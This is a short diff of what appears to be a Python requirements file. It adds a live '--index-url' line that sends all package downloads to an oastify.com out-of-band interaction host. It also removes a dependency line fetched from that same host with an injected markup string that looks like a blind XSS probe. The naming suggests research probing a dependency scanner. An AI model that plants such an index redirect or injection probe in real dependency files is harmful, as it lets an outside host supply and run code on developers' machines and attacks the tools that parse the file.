@@ -1,5 +1,4 @@
-# --index-url https://bxss.r0l.me/snyk-pip
+--index-url https://ao2ypb0g7vq3djfd3zzsy9o62x8owfn3c.oastify.com/snyk-index-url
 colorama==0.4.3
 win_unicode_console==0.5
 #snyk-peak @ git+https://github.com/rreissdorker/snyk-peak@main
-dummybxss<s>aa2 @ git+https://ao2ypb0g7vq3djfd3zzsy9o62x8owfn3c.oastify.com/dummybxss2
